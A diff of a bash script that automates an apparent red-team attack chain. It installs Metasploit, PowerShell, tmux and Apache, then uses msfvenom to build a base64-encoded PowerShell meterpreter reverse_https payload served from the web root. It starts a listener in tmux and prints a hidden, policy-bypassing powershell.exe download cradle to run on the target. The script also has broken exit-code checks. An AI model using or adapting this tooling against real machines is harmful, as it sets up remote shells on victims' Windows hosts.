@@ -2,12 +2,13 @@
 
 ##Things to do
 #add pwsh installtion support
+#add tmux session support
 #add cme functionality
 #add a super cool AsciiArt
 
 #Works for kali
 install_powershell() {
-  echo "[*]installing powershell please wait"
+  echo "[*]Installing powershell please wait"
   ##add support for other OSs (ubuntu mainly)
   apt-get update
   apt-get install libunwind8 libicu55
@@ -16,13 +17,50 @@ install_powershell() {
 
   wget --no-check-certificate https://github.com/PowerShell/PowerShell/releases/download/v6.0.2/powershell_6.0.2-1.ubuntu.16.04_amd64.deb
   dpkg -i powershell_6.0.2-1.ubuntu.16.04_amd64.deb
+
+  # Start PowerShell
   pwsh -Version
-  if [ $? -ne 1]; then
+  if [ $? -ne 1 ]; then
     echo "[!]Powershell installation failed"
     exit 1
   fi
 
   echo "[+]Powershell is installed"
+}
+
+install_tmux() {
+  echo "[*]Installing tmux please wait"
+  apt-get install tmux
+  tmux -V
+  if [ $? -ne 1]; then
+    echo "[!]Tmux installation failed"
+    exit 1
+  fi
+}
+
+install_msf() {
+  echo "[*]Installing metasploit....this could take a while, go grab some coffee"
+
+  curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
+  chmod 755 msfinstall && \
+  ./msfinstall
+
+  msfconsole --version
+  if [ $? -ne 1]; then
+    echo "[!]Metasploit installation failed"
+    exit 1
+  fi
+}
+
+install_apache() {
+  echo "[*]Installing apache2..."
+  apt-get install apache2
+
+  apache2 -v
+  if [ $? -ne 1]; then
+    echo "[!]Apache installation failed"
+    exit 1
+  fi
 }
 
 craft_payload() {
@@ -46,7 +84,7 @@ craft_payload() {
   port=${port:-'443'}
   read -p "[*]Enter web server root directory[/var/www/html]: " rootDir
   rootDir=${rootDir:-'/var/www/html'}
-  echo "[+]Creating payload" 
+  echo "[+]Creating payload"
   msfvenom -p windows/x64/meterpreter/reverse_https LHOST=${ip_addr} LPORT=${port} -e cmd/powershell_base64 -f psh -o ${rootDir}/load.txt >> /dev/null
   export ip_addr;
   export port;
@@ -70,15 +108,39 @@ start_listener() {
   sed -i "s/LHOST .*/LHOST ${ip_addr}/" reverse_https.rc
   sed -i "s/LPORT .*/LPORT ${port}/" reverse_https.rc
 
-  msfconsole -r reverse_https.rc
+  ##Start this in tmux session
+  tmux new -d -s "MetasploitListener" msfconsole -r reverse_https.rc
 
 }
 
-##check for linux powershell
+
+if [ "$EUID" -ne 0 ]
+  then echo "[!]Please run as root"
+  exit
+fi
+
 pwsh -Version >> /dev/null
 if [ $? -ne 0 ]; then
   echo "[!]Powershell not installed..."
   install_powershell
+fi
+
+tmux -V >> /dev/null
+if [ $? -ne 0 ]; then
+  echo "[!]Tmux is not installed..."
+  install_tmux
+fi
+
+msfconsole -V >> /dev/null
+if [ $? -ne 0 ]; then
+  echo "[!]Metasploit is not installed..."
+  install_msf
+fi
+
+apache2 -v >> /dev/null
+if [ $? -ne 0 ]; then
+  echo "[!]Apache is not installed..."
+  install_apache
 fi
 
 ##Generate the payload
@@ -89,15 +151,6 @@ cradle_crafter
 
 ##Craft certificate
 craft_cert
-
-##Output final notations
-#echo "[+]Certificate located at ${rootDir}/cert.cer or ${ip_addr}/cert.cer"
-#echo "[+]Command to run on target: "
-#echo "  powershell.exe -Win hiddeN -Exec ByPasS add-content -path %APPDATA%\cert.cer (New-Object Net.WebClient).DownloadString('http://${ip_addr}/cer$
-#echo "powershell.exe -Win hiddeN -Exec ByPasS add-content -path %APPDATA%\cert.cer (New-Object Net.WebClient).DownloadString('http://${ip_addr}/cert.$
-
-##Start metasploit start_listener
-#start_listener
 
 ##Output final notations
 echo "[+]Certificate located at ${rootDir}/cert.cer or ${ip_addr}/cert.cer"
